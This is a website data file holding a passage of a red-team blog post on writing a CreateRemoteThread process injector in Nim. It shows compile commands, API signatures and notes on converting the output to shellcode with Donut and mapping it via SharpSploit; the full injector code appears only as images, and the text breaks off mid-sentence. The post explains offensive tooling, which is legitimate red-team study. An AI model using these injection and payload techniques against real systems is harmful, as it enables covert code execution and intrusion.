{"componentChunkName":"component---node-modules-narative-gatsby-theme-novela-src-templates-author-template-tsx","path":"/authors/NotoriousRebel","result":{"pageContext":{"author":{"authorsPage":true,"bio":"Core developer for theHarvester \nand enjoys red teaming Windows.\n","id":"7971a4b2-8c15-5c5b-86fd-173de5dac0d9","name":"NotoriousRebel","featured":false,"social":[{"url":"https://github.com/NotoriousRebel"},{"url":"https://twitter.com/NotoriousRebel1"}],"slug":"/authors/NotoriousRebel","avatar":{"small":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAQDAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABrjkos4bjyQbg/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEEP/aAAgBAQABBQIPpKdiMjE1tF6Bo9S+sgB//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAHRAAAQIHAAAAAAAAAAAAAAAAIQABAhAREiAykf/aAAgBAQAGPwJyVFdXsyy1w//EABwQAQADAAIDAAAAAAAAAAAAAAEAESExQVFhgf/aAAgBAQABPyGgGxzD8Vto5aineSuMvMtY09sFBhzKSLP/2gAMAwEAAgADAAAAENsoff/EABcRAQADAAAAAAAAAAAAAAAAAAEAEBH/2gAIAQMBAT8QJhf/xAAWEQADAAAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QK//EAB0QAQACAgIDAAAAAAAAAAAAAAEAESExQVFxgfD/2gAIAQEAAT8Qx7JC2msS6kiAGs9l/ZgldMv9QZliIREN+PUDUxyJBIasmo7xG1SdpP/Z","aspectRatio":1,"src":"/static/c908e3ef9d0ce562bad340430706f232/fa1ea/rebel_avatar.jpg","srcSet":"/static/c908e3ef9d0ce562bad340430706f232/afb2b/rebel_avatar.jpg 13w,\n/static/c908e3ef9d0ce562bad340430706f232/7c20e/rebel_avatar.jpg 25w,\n/static/c908e3ef9d0ce562bad340430706f232/fa1ea/rebel_avatar.jpg 50w,\n/static/c908e3ef9d0ce562bad340430706f232/03612/rebel_avatar.jpg 75w,\n/static/c908e3ef9d0ce562bad340430706f232/61cdf/rebel_avatar.jpg 100w,\n/static/c908e3ef9d0ce562bad340430706f232/836e2/rebel_avatar.jpg 480w","srcWebp":"/static/c908e3ef9d0ce562bad340430706f232/e7b2c/rebel_avatar.webp","srcSetWebp":"/static/c908e3ef9d0ce562bad340430706f232/58718/rebel_avatar.webp 13w,\n/static/c908e3ef9d0ce562bad340430706f232/74aad/rebel_avatar.webp 25w,\n/static/c908e3ef9d0ce562bad340430706f232/e7b2c/rebel_avatar.webp 50w,\n/static/c908e3ef9d0ce562bad340430706f232/ed320/rebel_avatar.webp 75w,\n/static/c908e3ef9d0ce562bad340430706f232/66016/rebel_avatar.webp 100w,\n/static/c908e3ef9d0ce562bad340430706f232/35871/rebel_avatar.webp 480w","sizes":"(max-width: 50px) 100vw, 50px"},"medium":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAQDAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABrjkos4bjyQbg/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEEP/aAAgBAQABBQIPpKdiMjE1tF6Bo9S+sgB//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAHRAAAQIHAAAAAAAAAAAAAAAAIQABAhAREiAykf/aAAgBAQAGPwJyVFdXsyy1w//EABwQAQADAAIDAAAAAAAAAAAAAAEAESExQVFhgf/aAAgBAQABPyGgGxzD8Vto5aineSuMvMtY09sFBhzKSLP/2gAMAwEAAgADAAAAENsoff/EABcRAQADAAAAAAAAAAAAAAAAAAEAEBH/2gAIAQMBAT8QJhf/xAAWEQADAAAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QK//EAB0QAQACAgIDAAAAAAAAAAAAAAEAESExQVFxgfD/2gAIAQEAAT8Qx7JC2msS6kiAGs9l/ZgldMv9QZliIREN+PUDUxyJBIasmo7xG1SdpP/Z","aspectRatio":1,"src":"/static/c908e3ef9d0ce562bad340430706f232/61cdf/rebel_avatar.jpg","srcSet":"/static/c908e3ef9d0ce562bad340430706f232/7c20e/rebel_avatar.jpg 25w,\n/static/c908e3ef9d0ce562bad340430706f232/fa1ea/rebel_avatar.jpg 50w,\n/static/c908e3ef9d0ce562bad340430706f232/61cdf/rebel_avatar.jpg 100w,\n/static/c908e3ef9d0ce562bad340430706f232/59538/rebel_avatar.jpg 150w,\n/static/c908e3ef9d0ce562bad340430706f232/fd013/rebel_avatar.jpg 200w,\n/static/c908e3ef9d0ce562bad340430706f232/836e2/rebel_avatar.jpg 480w","srcWebp":"/static/c908e3ef9d0ce562bad340430706f232/66016/rebel_avatar.webp","srcSetWebp":"/static/c908e3ef9d0ce562bad340430706f232/74aad/rebel_avatar.webp 25w,\n/static/c908e3ef9d0ce562bad340430706f232/e7b2c/rebel_avatar.webp 50w,\n/static/c908e3ef9d0ce562bad340430706f232/66016/rebel_avatar.webp 100w,\n/static/c908e3ef9d0ce562bad340430706f232/d9b14/rebel_avatar.webp 150w,\n/static/c908e3ef9d0ce562bad340430706f232/6b183/rebel_avatar.webp 200w,\n/static/c908e3ef9d0ce562bad340430706f232/35871/rebel_avatar.webp 480w","sizes":"(max-width: 100px) 100vw, 100px"},"large":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAQDAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABrjkos4bjyQbg/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEEP/aAAgBAQABBQIPpKdiMjE1tF6Bo9S+sgB//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAHRAAAQIHAAAAAAAAAAAAAAAAIQABAhAREiAykf/aAAgBAQAGPwJyVFdXsyy1w//EABwQAQADAAIDAAAAAAAAAAAAAAEAESExQVFhgf/aAAgBAQABPyGgGxzD8Vto5aineSuMvMtY09sFBhzKSLP/2gAMAwEAAgADAAAAENsoff/EABcRAQADAAAAAAAAAAAAAAAAAAEAEBH/2gAIAQMBAT8QJhf/xAAWEQADAAAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QK//EAB0QAQACAgIDAAAAAAAAAAAAAAEAESExQVFxgfD/2gAIAQEAAT8Qx7JC2msS6kiAGs9l/ZgldMv9QZliIREN+PUDUxyJBIasmo7xG1SdpP/Z","aspectRatio":1,"src":"/static/c908e3ef9d0ce562bad340430706f232/ec46e/rebel_avatar.jpg","srcSet":"/static/c908e3ef9d0ce562bad340430706f232/a2637/rebel_avatar.jpg 82w,\n/static/c908e3ef9d0ce562bad340430706f232/15203/rebel_avatar.jpg 164w,\n/static/c908e3ef9d0ce562bad340430706f232/ec46e/rebel_avatar.jpg 328w,\n/static/c908e3ef9d0ce562bad340430706f232/836e2/rebel_avatar.jpg 480w","srcWebp":"/static/c908e3ef9d0ce562bad340430706f232/5a48e/rebel_avatar.webp","srcSetWebp":"/static/c908e3ef9d0ce562bad340430706f232/2d087/rebel_avatar.webp 82w,\n/static/c908e3ef9d0ce562bad340430706f232/29d87/rebel_avatar.webp 164w,\n/static/c908e3ef9d0ce562bad340430706f232/5a48e/rebel_avatar.webp 328w,\n/static/c908e3ef9d0ce562bad340430706f232/35871/rebel_avatar.webp 480w","sizes":"(max-width: 328px) 100vw, 328px"}}},"originalPath":"/authors/authors-notoriousrebel","skip":6,"limit":6,"group":[{"id":"c2062405-0fab-5377-bab2-3b1ad4ddf015","slug":"/Implant-Roulette-Part-1:-Nimplant","secret":false,"title":"Implant Roulette Part 1: Nimplant","author":"NotoriousRebel","date":"November 20th, 2020","dateForSEO":"2020-11-20T00:00:00.000Z","timeToRead":7,"excerpt":"The first in a new series looking at what Nim brings to the table for red team tool development.","canonical_url":null,"subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Implant Roulette Part 1: Nimplant\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2020-11-20T00:00:00.000Z\",\n  \"hero\": \"./images/test.jpg\",\n  \"excerpt\": \"The first in a new series looking at what Nim brings to the table for red team tool development.\",\n  \"secret\": false\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, \"When creating an implant what language first comes to mind? Of course, the answer is it depends;\\nhowever, typically it is one of the following languages: C, C++, C#, Rust, Go, or maybe even Python.\\nWhile those languages are all dandy, they are not the only programming languages that exist.\\nThroughout this series, I will be exploring different languages and seeing what\\nthey bring to the table for implant & offensive tool development.\\nThe first language that will be examined is \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://nim-lang.org/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Nim\"), \".\"), mdx(\"h3\", {\n    \"id\": \"what-is-nim\"\n  }, \"What is Nim\"), mdx(\"p\", null, \"If we visit \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/nim-lang/Nim\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Nim\\u2019s Github page\"), \" there is a concise definition of what Nim is.\\n\\u201CNim is a statically typed compiled systems programming language. It combines successful concepts from mature languages like Python, Ada and Modula.\\u201D\\nSome of the \\u201Cbig\\u201D benefits of Nim are:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"* Cross-Platform: Generated executables support Windows, Linux, BSD, and macOS.\\n* Nim can compile to C, C++, Objective-C, and JavaScript.\\n* Nim binaries are small and the compiler toolchain allows for a lot of optimizations\\n* Nim can interface with other languages through Nim's foreign function interface (FFI) [1]\\n* Nim syntax is very quick to pick up and is reminiscent of Python.\\n\")), mdx(\"p\", null, \"[1]\", \": \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://nim-lang.org/docs/backends.html#interfacing-nim-code-calling-the-backend\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://nim-lang.org/docs/backends.html#interfacing-nim-code-calling-the-backend\")), mdx(\"p\", null, \"Of course, these are not the only benefits of the language. More will reveal themself as time goes on.\"), mdx(\"h3\", {\n    \"id\": \"a-simple-injector\"\n  }, \"A Simple Injector\"), mdx(\"p\", null, \"Let\\u2019s get hands-on with Nim and see how to develop a simple injector.\\nBelow is an implementation of a typical CreateRemoteThread injector:\\nInstead of having to manually interop with the Windows API via the FFI there\\nare \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/nim-lang/nimble\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Nimble\"), \" packages that contain some Windows API\\ndefinitions. The one I tend to use is \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/khchen/winim\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Winim\"), \".\\nWinim can also \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://khchen.github.io/winim/com.html\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"interop with COM\"), \".\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"2216px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"31.768953068592054%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsSAAALEgHS3X78AAABWklEQVQY042R20oCURiFN2VRaDZOIal4KCoRM61ILU3TCc8QYilYL5F1XUpXKdFlvVCBKB0IghhzRpoXKB9g9YtCh6suPta//s1erM1mn90uFEWBKMsQ3yS02jJaUoeQ/w/dkd8VfFAWE8U2XEIO3GoMOk8GWncaamccmqUEJlzJH/z1fbTLKYw7YrAG83h+eQVrPjyB98Rg9CVgiBxi0pOCalHA0FwUzBwkAmAWUmuIdOvb92YrYaO9KUAF4rirN8Ea948UmIA5nIU5VIRpu0jBRVi8+5jx7UG/lqRdAYZQAdPUnnNmoHbEobLvYHg+CtWCADYbBr+Sxm29QQ0pcMQehWZ9FzwF6ShQG8hT0zg4fw48eT5ygKmNLDh3EmOuNL2A2tvCYAY/mHETTO/FqF3oB0qdDiqX1yiVazip1HBc7lHt61n1tx/sSj1OLwbnVRzRfH51Q58j4Qt2SATIZ8GE0gAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/c9d6d68b96f6495705555553bc886dba/59273/crt_injector.webp 2216w\"],\n    \"sizes\": \"(max-width: 2216px) 100vw, 2216px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/c9d6d68b96f6495705555553bc886dba/fa827/crt_injector.png 2216w\"],\n    \"sizes\": \"(max-width: 2216px) 100vw, 2216px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/c9d6d68b96f6495705555553bc886dba/fa827/crt_injector.png\",\n    \"alt\": \"crt_injector\",\n    \"title\": \"crt_injector\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Let\\u2019s compile, run the program:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"nim c --run crtinjection.nim\\n\")), mdx(\"p\", null, \"and make sure everything works. By default when you compile Nim code it generates\\nC code. In the latter section \\u201CIntegrating into Existing Tooling\\u201D verification shall\\nensue.\"), mdx(\"p\", null, \"If you do not want to use third party packages that is fine if you examine\\nwhat Winim does under the hood for example when \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/khchen/winim/blob/d300192c588f73dddef26e3c317f148aa23465c3/winim/inc/winbase.nim#L1942\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"calling CreateRemoteThread\"), \".\\nIt is simply importing the function for us as denoted by the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://nim-lang.org/docs/manual.html#foreign-function-interface-importc-pragma\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"importc pragma\"), \"\\nas that allows us to import a proc or a variable from C. Also, available for importing\\nfrom foreign languages are: \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \".importcpp\"), \", \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \".importobjc\"), \", and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"importjs\"), \".\"), mdx(\"p\", null, \"CreateRemoteThread proc:\"), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"proc CreateRemoteThread*(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE {.winapi, stdcall, dynlib: \\\"kernel32\\\", importc.}\")), mdx(\"h3\", {\n    \"id\": \"peeking-under-the-hood\"\n  }, \"Peeking Under the Hood\"), mdx(\"p\", null, \"What is going on under the hood is quite interesting. If we inspect the executable\\u2019s IAT we see\\nthere are no static imports for OpenProcess, VirualAllocEx, WriteProcessMemory, and CreateRemoteThread.\\nThat is because Nim is dynamically loading the required libraries with LoadLibraryA and GetProcAddress.\\nFurthermore, when compiled Nim will place the source code of the language you are targeting in a folder\\nnamed nimcache. You can also specify the nimcache path for generated files with the compiler flag\\n\", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"--nimcache:PATH\"), \".\"), mdx(\"p\", null, \"Below is a snippet of generated code for inject.nim\\nTo make this easier to read I have compiled the program with an additional flag \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"--embedsrc:on\"), \".\\nThis flag tells the Nim compiler to embed the source code as comments in the generated output. For compilation:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"nim c --run --hints:on --d:release --embedsrc:on inject.nim\\n\")), mdx(\"p\", null, \"A snippet of generated C source code that performs injection:\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1081px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"76.87326549491212%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABJ0AAASdAHeZh94AAACBElEQVQ4y5VT6Y6bMBjMeyRggy98cqNWff/nmg5ONkpX2W37Y2Rjwfibg4uwA1JKOI4dx76g5IwYAiLP3ODQNA3atv1nXIRx6KxB3GZo7yCNrs9d1/8X0QvhAOUs7Dyh9wNaZyDdSShxvV5xu97qeqK5NU/cKm4V9ay549KS0JFw2RYkkua5wAYPR9lDGBBSQMoRMQf0pofUHVfC9lAPSC0helFxOT3URiFvCbZ4hNUj7vTwiHymv3vE+KsgTZHvcXLCcoDTX8+LT3SqQyvotWgfhLzVjfx4SfDFIcx8ceQH6dyTfA1QnO6U3zxkvuJDbpUsrIfhy4kkhVOWLWNYmTT3PnHipaCshdPpb8No2nsbqoeGqc77iOXYEOmjnjJUorcxwrE+Q6Qdxj7N/yB4V6mLcJzQahJlZEoOExOPPasjWSGBzknuudoOKvTVp1eiz6R3ySRMS8DEAJYfnPTnhHmbMNBDFQyMN1DDCV0JvyJ7ELKHDMWMGm5hejNTXAx01lBRQRdWIxOcWqWe5/dVdOI9Ycs/RWvWZh0xMYyBU9jBMlVC8xLutVU8M1VJnVD8ZULNlDOrcdYl7fTyKIhLZsEthBR/pvmsyFe/HkPRbL4plDhzqvUByrejq0F0XkAymM+dewcShio5MeXCEjuv+cvZKlG7nnvHUHiBo3xrIaX8to+/Ad0QqMNpxI88AAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/f871bb711a469344dbd19d321401823a/9de0b/snippet_inject.webp 1081w\"],\n    \"sizes\": \"(max-width: 1081px) 100vw, 1081px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/f871bb711a469344dbd19d321401823a/9a8de/snippet_inject.png 1081w\"],\n    \"sizes\": \"(max-width: 1081px) 100vw, 1081px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/f871bb711a469344dbd19d321401823a/9a8de/snippet_inject.png\",\n    \"alt\": \"Inject_Snippet\",\n    \"title\": \"Inject_Snippet\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Here we can inspect what our function calls are doing under the hood. The\\nWindows API calls done by winim rely on the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://nim-lang.org/docs/dynlib.html\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"dynlib module\"), \" to dynamically\\ninvoke calls. If we inspect that source code we can see\\nthe LoadLibraryA and GetProcAddress combination.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"863px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"38.006952491309384%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABKUlEQVQoz32SWXKDMBBEuYcRaEdCImKJHTv3v1dnRgaX7VTy8T6okXq6WzQxBHxsZ8yfF5Q5w3oPZTxiDETEOI6YpgmlFAxjhEoBMg4YhqHOEpFzRqYzzjk0Skq4dUO6fiEuC4xRkLInZEUIgdPpVGnbFmKn3Tlmx7xRSiHkGWVbUS5nlGVGoo3sgB1qre9CJPwXXdc9aLyzSDEjjhMGiilpQS8VCSnwMo7BWGuhSFwqXZfwtzHmkUKIXXDwDvl6Q7l+Uw8Zmi8qg0AOnffV5YFz3O9d3NMsUP8s/uyyRrZjRlhn5PNGlww6ctfRZrX3eHTVvvV3VMFCR/yGN8RUqLuFXnutLm1OUOSCo7KTvu9fenrn1SE5sNpC06/SS34A8esln138J8z8AFNT4Pt+ovvZAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/8c2d1836e5e394c3d66dd878af26a70f/754d3/dynlib_code.webp 863w\"],\n    \"sizes\": \"(max-width: 863px) 100vw, 863px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/8c2d1836e5e394c3d66dd878af26a70f/e3d9b/dynlib_code.png 863w\"],\n    \"sizes\": \"(max-width: 863px) 100vw, 863px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/8c2d1836e5e394c3d66dd878af26a70f/e3d9b/dynlib_code.png\",\n    \"alt\": \"dynlib_code\",\n    \"title\": \"dynlib_code\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"nim-and-donut\"\n  }, \"Nim and Donut\"), mdx(\"p\", null, \"Coming from C# one of my favorite tools for crafting payloads is \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/theWover/Donut\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Donut\"), \".\\nOne of the great features with Donut is that it not only works with .NET assemblies but also works with native DLLs\\nand executables. Since Nim can generate both C and C++ source code and link it to a native executable or DLL\\nDonut is an amazing utility that can transform our output into shellcode.\\nSince shellcode is language-agnostic we can easily integrate it into other tooling.\"), mdx(\"h3\", {\n    \"id\": \"integrating-into-existing-tooling\"\n  }, \"Integrating into Existing Tooling\"), mdx(\"p\", null, \"With shellcode you can easily integrate it into your own custom injectors in the language of your choice.\\nOf course, since these are native executables and DLL\\u2019s we can also perform manual mapping and load them into memory.\\nComing from C# my preferred tools to perform the manual mapping are \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/Dewera/Lunar\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Lunar\"), \"\\nand the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/cobbr/SharpSploit/tree/master/SharpSploit/Execution/DynamicInvoke\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"D/Invoke tooling in SharpSploit\"), \".\"), mdx(\"p\", null, \"Let\\u2019s compile the injector code as a DLL and export an inject function.\\nTo export the function we need to tell Nim to export it by adding the\\nfollowing pragmas: \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"exportc, dynlib, and cdecl. or stdcall.\"), \"\\nThe resulting inject proc is as follows:\\n\", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"proc inject(pid: int): bool {.stdcall, exportc, dynlib.} = \"), \" \", mdx(\"br\", null), \"\\nLet\\u2019s compile the DLL as follows:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"nim c --d:release --app:lib --opt:size --inject.nim\\n\")), mdx(\"p\", null, \"With the DLL let\\u2019s manually map it using SharpSploit\\u2019s D/Invoke tooling.\\nIf you specifically just want the D/Invoke part you can also use the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/TheWover/DInvoke\",\n    \"target\": 